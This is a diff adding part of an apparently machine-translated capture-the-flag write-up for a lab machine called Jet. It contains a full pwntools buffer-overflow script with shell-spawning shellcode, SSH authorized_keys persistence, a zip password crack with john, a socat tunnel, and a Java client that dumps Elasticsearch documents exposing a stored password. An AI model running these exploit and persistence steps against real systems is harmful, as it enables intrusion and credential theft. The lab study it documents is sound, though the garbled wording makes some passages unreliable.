@@ -648,6 +648,420 @@ pwndbg>
 ```
 n order to run the exploit that we will do from our machine we will play with socat so that the program runs and we have access from the port 9999
 
+```console
+www-data@jet:~$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &  
+[1] 7321
+www-data@jet:~$
+```
+We start a scriptpython to exploit it by importing the library pwnand defining a shellcode that will execute a /bin/shbit64
+
+```console
+#!/usr/bin/python3
+from pwn import remote, p64
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+```
+We define the one offset we know and fill in A until we reach RIP
+
+```console
+offset = 72
+junk = b"A" * (offset - len(shellcode))
+```
+Now we define the connection to the machine and wait to receive the message
+
+```console
+shell = remote("10.13.37.10", 9999)
+shell.recvuntil(b"Oops, I'm leaking! ")
+```
+We receive the address lekeadaand convert it to decimal, followed by that with the function p64 we give it the format that Python needs to execute it in 64bits
+
+`ret = p64(int(shell.recvuntil(b"\n"),16))`
+
+The payload will do the following, it will send the shellcode and the junk to reach it RIP, with which dirección we are lekea we will return to the beginning of input where our is shellcode in this way it will be executed, we define and send the payload
+
+```console
+payload = shellcode + junk + ret  
+
+shell.sendlineafter(b"> ", payload)
+shell.interactive()
+```
+Our script end would be the following, when executing it we get shell like alex
+
+```console
+#!/usr/bin/python3
+from pwn import remote, p64
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  
+
+offset = 72
+junk = b"A" * (offset - len(shellcode))
+
+shell = remote("10.13.37.10", 9999)
+shell.recvuntil(b"Oops, I'm leaking! ")
+
+ret = p64(int(shell.recvuntil(b"\n"),16))
+
+payload = shellcode + junk + ret  
+
+shell.sendlineafter(b"> ", payload)
+shell.interactive()
+```
+```console
+$ python3 exploit.py 
+[+] Opening connection to 10.13.37.10 on port 9999: Done  
+[*] Switching to interactive mode
+$ whoami
+alex
+$
+```
+
+We are alex, in our personal user directory we can find the flag
+
+To connect via ssh and get a better shell we can create a directory .ssh and send our shell id_rsa.pub to the directory with the name authorized_keys
+
+```console
+$ mkdir .ssh
+$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > .ssh/authorized_keys  
+$
+```
+
+Now we can connect as the user alex without a password and read the flag
+
+```console
+ssh alex@10.13.37.10
+alex@jet:~$ id
+uid=1005(alex) gid=1005(alex) groups=1005(alex)  
+alex@jet:~$ hostname -I
+10.13.37.10 
+alex@jet:~$ cat flag.txt  
+JET{0****************z}
+alex@jet:~$
+```
+## Secret Message
+We have several files in our home directory, a .zip, a , .txt and a.py
+
+```console
+alex@jet:~$ ls -l
+-rw-r--r-- 1 root root  659 Jan  3  2018 crypter.py
+-rw-r--r-- 1 root root 1481 Dec 28  2017 encrypted.txt
+-rw-r--r-- 1 root root 7285 Dec 27  2017 exploitme.zip  
+-rw-r--r-- 1 root root   27 Dec 28  2017 flag.txt
+alex@jet:~$
+```
+To work more comfortably locally we can download the files using the ssh connection using scp pointing to * for all files
+```console
+scp alex@10.13.37.10:"*" .
+crypter.py                                   100%  659     3.4KB/s   00:00
+encrypted.txt                                100% 1481     7.5KB/s   00:00
+exploitme.zip                                100% 7285    38.0KB/s   00:00
+```
+We start with the one .zip that is protected with a password that we do not know.
+
+```console
+unzip exploitme.zip 
+Archive:  exploitme.zip
+[exploitme.zip] membermanager password:
+```
+The script takes the message.txt and applies a xor using as key a password that we don’t know, then saves it in the file calleden crypted.txt
+```console
+import binascii
+
+def makeList(stringVal):
+    list = []
+    for c in stringVal:
+        list.append(c)
+    return list
+
+def superCrypt(stringVal,keyVal):
+    keyPos = 0
+    key = makeList(keyVal)
+    xored = []
+    for c in stringVal:
+        xored.append(binascii.hexlify(chr(ord(c) ^ ord(keyVal[keyPos]))))  
+        if keyPos == len(key) - 1:
+            keyPos = 0
+        else:
+            keyPos += 1
+    hexVal = ''
+    for n in xored:
+        hexVal += n
+    return hexVal
+
+with open('message.txt') as f:
+    content = f.read()
+
+key = sys.argv[1]
+
+with open('encrypted.txt', 'w') as f:
+    output = f.write(binascii.unhexlify(superCrypt(content, key)))
+```
+Using xortool with encrypted.txt we can determine a possible longitud , the highest probability is the length of 17 characters with a15.7%
+
+```console
+xortool encrypted.txt 
+The most probable key lengths:
+ 1:  13.3%
+ 4:  13.8%
+ 8:  11.4%
+12:  10.0%
+14:   8.7%
+17:  15.7%
+20:   7.3%
+24:   6.1%
+28:   5.5%
+34:   8.3%
+Key-length can be 4*n
+Most possible char is needed to guess the key!
+```
+Now we indicate the length of 17characters with -l and -c 20 since we are talking about a text file, we get an approximation of the password
+```console
+xortool -l 17 -c 20 encrypted.txt
+18 possible key(s) of length 17:
+secxrezebin&rocf~
+secxrezebin&rbcf~
+secxrezebin"rocf~
+secxrezebin"rbcf~
+secxrezebinnrocf~
+...
+Found 18 plaintexts with 95%+ valid characters
+See files filename-key.csv, filename-char_used-perc_valid.csv
+```
+The beginning of the password looks pretty similar to the domain we know, so we can assume that the first characters are the domain name.
+```console
+www.securewebinc.jet
+
+secxrezebinnrocf~
+securewebinc*****
+```
+We can create a script that creates combinations of 17 characters that start with securewebinc, thus creating a dictionary that we will call keys.txt
+
+```console
+#!/usr/bin/python3
+import string, itertools
+
+base = 'securewebinc'
+
+length = 17
+
+keys = [base + s for s in map(''.join, itertools.product(string.ascii_lowercase, repeat=length-len(base)))]  
+
+with open('keys.txt', 'w') as file:
+    for key in keys:
+        file.write(key + '\n')
+```
+When running it, it creates the file with all the combinaciones, however we have a small problem: there are almost 12 millones1000 possible passwords in total.
+python3 exploit.py
+
+```console
+wc -l keys.txt 
+11881376 keys.txt
+```
+Bruteforcing the password xor is complicated, however… we have a zip password that may be used misma, we start by creating a hash zip
+
+`zip2john exploitme.zip > hash`
+
+By applying brute force with john using our diccionario we obtain the password zip that is probably the same one used for the xor
+
+```console
+john -w:keys.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+securewebincrocks (exploitme.zip)
+Use the "--show" option to display all of the cracked passwords reliably  
+Session completed.
+```
+We create a script process that performs inverso the crypter and thus using the key secure webincrockstry to obtain the original content of the message.txt
+
+```console
+#!/usr/bin/python3
+import binascii
+
+def makeList(stringVal):
+    return [c for c in stringVal]
+
+def decrypt(hexVal, keyVal):
+    keyPos = 0
+    key = makeList(keyVal)
+    xored = b''
+    for i in range(0, len(hexVal), 2):
+        byte = bytes.fromhex(hexVal[i:i+2])[0]
+        xored += bytes([byte ^ ord(key[keyPos])])  
+        if keyPos == len(key) - 1:
+            keyPos = 0
+        else:
+            keyPos += 1
+    return xored.decode()
+
+with open('encrypted.txt', 'rb') as f:
+    content = f.read()
+
+message = decrypt(content.hex(), 'securewebincrocks')  
+
+print(message)
+```
+When running it we get the message original where we can see the flag
+
+```console
+python3 decrypt.py
+Hello mate!
+
+First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!
+
+Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
+Make sure those binaries are kept safe!
+
+To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.
+
+The ports are 5555 and 7777.
+Have fun and keep it safe!
+
+JET{r****************************************************d}
+
+
+Cheers - Alex
+
+-----------------------------------------------------------------------------
+This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.  
+-----------------------------------------------------------------------------
+```
+## Elasticity
+With netstat we can list all the open internal ports, by doing so we can find several among them the port 9300 that is running elasticsearch
+```console
+alex@jet:~$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:7777            0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 10.13.37.10:9201        0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     
+tcp        0      0 10.13.37.10:53          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN     
+tcp        0      0 10.13.37.10:7777        10.10.14.6:58150        ESTABLISHED
+tcp        0      0 10.13.37.10:5555        10.10.14.6:53574        ESTABLISHED
+tcp        0     51 10.13.37.10:47268       10.10.14.11:4444        ESTABLISHED
+tcp        0    244 10.13.37.10:22          10.10.14.19:51638       ESTABLISHED  
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 ::1:953                 :::*                    LISTEN     
+tcp6       0      0 127.0.0.1:9200          :::*                    LISTEN     
+tcp6       0      0 127.0.0.1:9300          :::*                    LISTEN     
+tcp6       0      0 :::53                   :::*                    LISTEN     
+alex@jet:~$
+```
+To have access from outside we will use again socat to redirect what is received from the port 8080 to the port 9300 where elasticsearch is running
+```console
+alex@jet:~$ socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9300 &  
+[1] 62178
+alex@jet:~$
+```
+
+With a program in java para we can connect to one cluster of elastic searchthem and create an object that transport econnects to the machine through the port 8080 by performing a simple search through the index test
+
+```console
+import java.net.InetSocketAddress;
+import java.net.InetAddress;
+import java.util.Map;
+
+import org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;
+import org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;
+import org.elasticsearch.action.admin.indices.get.GetIndexResponse;
+import org.elasticsearch.action.admin.indices.get.GetIndexRequest;
+import org.elasticsearch.transport.client.PreBuiltTransportClient;
+import org.elasticsearch.cluster.health.ClusterIndexHealth;
+import org.elasticsearch.common.transport.TransportAddress;
+import org.elasticsearch.client.transport.TransportClient;
+import org.elasticsearch.action.search.SearchResponse;
+import org.elasticsearch.client.IndicesAdminClient;
+import org.elasticsearch.common.settings.Settings;
+import org.elasticsearch.search.SearchHit;
+import org.elasticsearch.client.Client;
+
+public class Program {
+    public static void main(String[] args) {
+        byte[] ipAddr = new byte[]{10, 13, 37, 10};
+        Client client = new PreBuiltTransportClient(Settings.EMPTY)
+            .addTransportAddress(new TransportAddress(new InetSocketAddress("10.13.37.10", 8080)));  
+        System.out.println(client.toString());
+        ClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();
+        for (ClusterIndexHealth health : healths.getIndices().values()) {
+            String index = health.getIndex();
+            System.out.println(index);
+        }
+        SearchResponse searchResponse = client.prepareSearch("test").execute().actionGet();
+        SearchHit[] results = searchResponse.getHits().getHits();
+        for(SearchHit hit : results){
+            String sourceAsString = hit.getSourceAsString();
+            System.out.println(sourceAsString);
+        }
+        client.close();
+    }
+}
+```
+Now we compile it using javac the parameter indicating the directory where all the jars necessary for the program -cp are located .librerias
+
+`javac -cp "/usr/share/elasticsearch/lib/*" Program.java`
+
+When running the program it returns a jsonfairly extensive file with different data, in a section of all content we can find the flag
+
+```console
+java -cp ".:/usr/share/elasticsearch/lib/*" Program | jq
+
+{
+  "timestamp": "2017-11-13 08:31",
+  "subject": "Just a heads up Rob",
+  "category": "admin",
+  "draft": "no",
+  "body": "Hey Rob - just so you know, that information you wanted has beensent."
+}
+{
+  "timestamp": "2017-11-10 07:00",
+  "subject": "Maintenance",
+  "category": "maintenance",
+  "draft": "no",
+  "body": "Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday"
+}
+{
+  "timestamp": "2017-11-13 08:30",
+  "subject": "Details for upgrades to EU-API-7",
+  "category": "admin",
+  "draft": "yes",
+  "body": "Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don _NOT_ tell _ANYONE_. We need a better way of sharing secrets. The password is purpl3un1c0rn_1969. -Jason JET{3******************n}"  
+}
+{
+  "timestamp": "2017-11-13 13:32",
+  "subject": "Upgrades complete",
+  "category": "Maintenance",
+  "draft": "no",
+  "body": "All upgrades are complete, and normal service resumed"
+}
+{
+  "timestamp": "2017-11-09 15:13",
+  "subject": "Server outage",
+  "category": "outage",
+  "draft": "no",
+  "body": "Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed"
+}
+{
+  "timestamp": "2017-11-13 13:40",
+  "subject": "Thanks Jazz",
+  "category": "admin",
+  "draft": "no",
+  "body": "Thanks dude - all done. You can delete our little secret. Kind regards, Rob"
+}
+{
+  "timestamp": "2017-11-13 08:27",
+  "subject": "Upgrades",
+  "category": "maintenance",
+  "draft": "no",
+  "body": "An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances"
+}
+```
+## Member Manager
+
+We had the password from zip decrypting the message xor, so we simply unzipped it, doing so leaves us with 2 ejecutables Linux files
 
 <html lang="en">
 <head>
